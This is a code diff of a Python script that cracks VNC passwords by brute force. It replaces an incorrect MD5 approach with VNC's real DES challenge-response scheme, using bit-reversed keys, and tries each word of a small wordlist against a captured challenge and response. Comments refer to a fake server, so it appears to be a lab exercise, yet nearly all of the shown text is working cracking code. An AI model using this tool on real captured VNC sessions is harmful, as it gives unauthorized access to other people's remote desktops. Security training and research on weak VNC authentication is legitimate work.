@@ -1,28 +1,36 @@
-import hashlib
+from Crypto.Cipher import DES
 
-# captured challenge and hash from the client
-captured_challenge = bytes.fromhex("3defc5e677e85540a98bcfeefdb7566e")
-captured_response = bytes.fromhex("04ae41e76a5c9405a832a633371eaf3a")
+# Captured from fake server log
+captured_challenge = bytes.fromhex("bd35d217b45d6eba9723baac29f7b9f5")
+captured_response = bytes.fromhex("faa75e316d5fc4de969ff3f48796eaf8")  # replace with actual response
 
-# Your wordlist
 wordlist = [
     "123456",
     "password",
     "admin",
     "letmein",
     "qwerty",
-    "secret",  # correct for fake server
+    "secret",  # correct password
     "welcome",
 ]
 
-def crack_vnc_password(challenge, expected_hash, wordlist):
-    print(f" Starting brute-force...")
+def reverse_bits(byte):
+    return int('{:08b}'.format(byte)[::-1], 2)
+
+def des_encrypt_challenge(challenge, password):
+    key = password.encode('latin-1').ljust(8, b'\x00')[:8]
+    key = bytes([reverse_bits(b) for b in key])
+    des = DES.new(key, DES.MODE_ECB)
+    return des.encrypt(challenge[:8]) + des.encrypt(challenge[8:])
+
+def crack_vnc_password(challenge, expected_response, wordlist):
+    print("Starting brute-force...")
     for password in wordlist:
-        candidate = hashlib.md5(password.encode() + challenge).digest()
-        if candidate == expected_hash:
-            print(f" Password cracked: '{password}'")
+        response = des_encrypt_challenge(challenge, password)
+        if response == expected_response:
+            print(f"[+] Password cracked: '{password}'")
             return password
-    print("Password not found in wordlist.")
+    print("[-] Password not found in wordlist.")
     return None
 
 if __name__ == "__main__":
